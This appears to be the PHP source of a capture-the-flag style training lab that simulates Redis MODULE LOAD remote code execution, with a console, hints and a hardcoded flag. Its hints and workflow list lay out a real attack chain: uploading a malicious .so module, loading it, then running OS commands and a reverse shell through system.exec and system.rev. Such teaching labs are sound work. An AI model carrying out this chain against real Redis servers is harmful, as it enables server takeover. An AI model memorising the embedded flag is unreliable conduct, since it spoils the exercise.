<?php
require_once __DIR__ . '/../../includes/db.php';
$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* ===========================
   REDIS LAB 5. MODULE LOAD RCE
   Real Redis for data, simulated MODULE LOAD/system.exec
   =========================== */

if (isset($_POST['flag'])) {
    $submitted = trim($_POST['flag']);
    if ($submitted === 'FLAG{rd_m0dul3_l04d_rc3}') {
        $_SESSION['redis_lab5_solved'] = true;
        header("Location: " . url_lab_from_slug("redis/lab5", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}

// Track loaded modules in session
if (!isset($_SESSION['redis_lab5_modules'])) {
    $_SESSION['redis_lab5_modules'] = [];
}

/**
 * Execute a Redis command. Real Redis for GET/SET/KEYS/INFO data,
 * simulated MODULE LOAD and system.exec for safety.
 */
function lab5Execute($rawCmd, $conn, $prefix, &$modules) {
    $log = [];
    $rceOutput = null;

    $parts = preg_split('/\s+/', trim($rawCmd), 4);
    $cmd = strtoupper($parts[0] ?? '');

    switch ($cmd) {
        case 'MODULE':
            $subCmd = strtoupper($parts[1] ?? '');

            switch ($subCmd) {
                case 'LOAD':
                    $path = $parts[2] ?? '';
                    if (empty($path)) {
                        $log[] = ['cmd' => 'MODULE LOAD', 'result' => '(error) ERR wrong number of arguments'];
                        break;
                    }

                    $moduleName = basename($path, '.so');
                    $modules[] = [
                        'name' => $moduleName,
                        'path' => $path,
                        'commands' => ['system.exec', 'system.rev']
                    ];

                    $log[] = [
                        'cmd' => "MODULE LOAD $path",
                        'result' => "OK. Module '$moduleName' loaded successfully.\n" .
                            "New commands available: system.exec, system.rev"
                    ];
                    break;

                case 'LIST':
                    if (empty($modules)) {
                        $log[] = ['cmd' => 'MODULE LIST', 'result' => '(empty list)'];
                    } else {
                        $list = '';
                        foreach ($modules as $i => $mod) {
                            $list .= ($i + 1) . ") name: " . $mod['name'] . " path: " . $mod['path'] . "\n";
                            $list .= "   commands: " . implode(', ', $mod['commands']) . "\n";
                        }
                        $log[] = ['cmd' => 'MODULE LIST', 'result' => $list];
                    }
                    break;

                case 'UNLOAD':
                    $modName = $parts[2] ?? '';
                    $modules = array_values(array_filter($modules, function($m) use ($modName) {
                        return $m['name'] !== $modName;
                    }));
                    $log[] = ['cmd' => "MODULE UNLOAD $modName", 'result' => 'OK'];
                    break;

                default:
                    $log[] = ['cmd' => implode(' ', $parts), 'result' => "(error) ERR Unknown MODULE subcommand '$subCmd'"];
            }
            break;

        case 'GET':
            $key = $parts[1] ?? '';
            $fullKey = $prefix . $key;
            $val = $conn->get($fullKey);
            $log[] = ['cmd' => $rawCmd, 'result' => ($val === false) ? '(nil)' : $val];
            break;

        case 'SET':
            $key = $parts[1] ?? '';
            $value = $parts[2] ?? '';
            $fullKey = $prefix . $key;
            $conn->set($fullKey, $value);
            $log[] = ['cmd' => $rawCmd, 'result' => 'OK'];
            break;

        case 'KEYS':
            $pattern = $parts[1] ?? '*';
            $fullPattern = $prefix . $pattern;
            $keys = $conn->keys($fullPattern);
            $shortKeys = array_map(function($k) use ($prefix) {
                return str_replace($prefix, '', $k);
            }, $keys);
            $result = implode("\n", $shortKeys);
            $log[] = ['cmd' => $rawCmd, 'result' => $result ?: '(empty list)'];
            break;

        case 'INFO':
            // Mix real Redis info with simulated module info
            $info = "# Server\nredis_version:6.2.7\n";
            $info .= "os:Linux 5.15.0 x86_64\n";
            $info .= "# Modules\n";
            if (empty($modules)) {
                $info .= "(no modules loaded)\n";
            } else {
                foreach ($modules as $mod) {
                    $info .= "module:" . $mod['name'] . " path:" . $mod['path'] . "\n";
                }
            }
            $log[] = ['cmd' => $rawCmd, 'result' => $info];
            break;

        case 'SYSTEM.EXEC':
        case 'SYSTEM.REV':
            // Commands provided by malicious module
            if (empty($modules)) {
                $log[] = ['cmd' => $rawCmd, 'result' => "(error) ERR unknown command '" . strtolower($cmd) . "'"];
                break;
            }

            $shellCmd = trim(implode(' ', array_slice($parts, 1)));

            // Simulated command execution output
            $simulated_outputs = [
                'id' => 'uid=999(redis) gid=999(redis) groups=999(redis)',
                'whoami' => 'redis',
                'uname -a' => 'Linux redis-server 5.15.0-generic #1 SMP x86_64 GNU/Linux',
                'cat /etc/passwd' => "root:x:0:0:root:/root:/bin/bash\nredis:x:999:999::/var/lib/redis:/bin/false",
                'ls /var/lib/redis' => "dump.rdb\nnodes.conf",
                'cat /flag.txt' => 'FLAG{rd_m0dul3_l04d_rc3}',
                'ls /' => "bin\nboot\ndev\netc\nflag.txt\nhome\nlib\nproc\nroot\nsrv\ntmp\nusr\nvar",
            ];

            $output = $simulated_outputs[$shellCmd] ?? "sh: command executed: $shellCmd";
            $rceOutput = $output;

            $log[] = [
                'cmd' => $rawCmd,
                'result' => $output
            ];
            break;

        default:
            $log[] = ['cmd' => $rawCmd, 'result' => "(error) ERR unknown command '$cmd'"];
    }

    return ['log' => $log, 'rceOutput' => $rceOutput];
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 5. MODULE LOAD Remote Code Execution</h3>

    <h4>Scenario</h4>
    <p>
        A <strong>conceptual demonstration</strong> of the Redis MODULE LOAD attack.
        Redis 4.0+ supports loadable modules (shared object <code>.so</code> files). If an
        attacker can upload a malicious module and load it, they achieve full Remote Code Execution
        on the server.
    </p>

    <h4>Objective</h4>
    <p>
        Load a malicious Redis module that provides
        <code>system.exec</code> command, then use it to execute system commands and
        find the flag. The flag is in <code>/flag.txt</code>.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The attack chain is: upload malicious <code>.so</code> (via CONFIG SET file write or rogue server sync).<br>
        2. Then <code>MODULE LOAD /path/to/evil.so</code> to load the module.<br>
        3. Then <code>system.exec &lt;command&gt;</code> to execute OS commands.<br>
        4. Try <code>system.exec cat /flag.txt</code> to retrieve the flag.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" placeholder="Enter the flag..." class="input" required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<?php if (!empty($_SESSION['redis_lab5_solved'])): ?>
<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You demonstrated Remote Code Execution via malicious Redis module loading.</div>
    </div>
</div>
<?php endif; ?>

<!-- Redis Command Interface -->
<div class="card">
    <h4>Redis Instance. Command Console</h4>
    <p>
        Available commands: GET, SET, KEYS, INFO, MODULE (LOAD/LIST/UNLOAD).
        After loading a module, new commands become available.
    </p>
    <form method="POST" class="form-row">
<input type="text" name="cmd" placeholder="Redis command (try: MODULE LIST)" class="input" value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>" style="font-family: 'JetBrains Mono', monospace;">
        <button type="submit" class="btn btn-primary">Execute</button>
    </form>

    <?php
    if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
        $rawCmd = $_POST['cmd'];

        // Track MODULE LOAD/UNLOAD for session persistence
        if (preg_match('/^MODULE\s+LOAD\s+(.+)$/i', $rawCmd, $m)) {
            // Will be added inside lab5Execute
        }
        if (preg_match('/^MODULE\s+UNLOAD\s+(.+)$/i', $rawCmd, $m)) {
            // Will be removed inside lab5Execute
        }

        $modules = &$_SESSION['redis_lab5_modules'];
        $execResult = lab5Execute($rawCmd, $conn, $redisPrefix, $modules);
        $log = $execResult['log'];

        echo '<div class="terminal query-output">';
        echo '<div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">Redis Console</span></div>';
        echo '<div class="terminal-body">';

        foreach ($log as $entry) {
            echo '<span class="prompt">redis> </span>' . htmlspecialchars($entry['cmd']) . "<br>";
            echo '<pre style="margin:4px 0 12px 0;color:inherit;white-space:pre-wrap;">' . htmlspecialchars($entry['result']) . '</pre>';
        }

        echo '</div></div>';

        // RCE warning
        if ($execResult['rceOutput'] !== null) {
            echo '<div class="result-error result-box">';
            echo '<strong>REMOTE CODE EXECUTION!</strong> The malicious module provides direct system command execution. ';
            echo 'The attacker has full control of the Redis server process.';
            echo '</div>';
        }
    }
    ?>
</div>

<!-- Attack Workflow Reference -->
<div class="card">
    <h4>Attack Workflow Reference</h4>
    <p>The MODULE LOAD attack typically follows this sequence:</p>
    <ol>
        <li>Compile a malicious Redis module (e.g., <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" style="color:var(--accent);">RedisModules-ExecuteCommand</a>)</li>
        <li>Upload the <code>.so</code> file to the server (via CONFIG SET file write or rogue SLAVEOF sync)</li>
        <li><code>MODULE LOAD /path/to/evil.so</code>: loads the module</li>
        <li><code>system.exec &lt;command&gt;</code>: execute arbitrary OS commands</li>
        <li><code>system.rev &lt;ip&gt; &lt;port&gt;</code>: reverse shell</li>
    </ol>
</div>
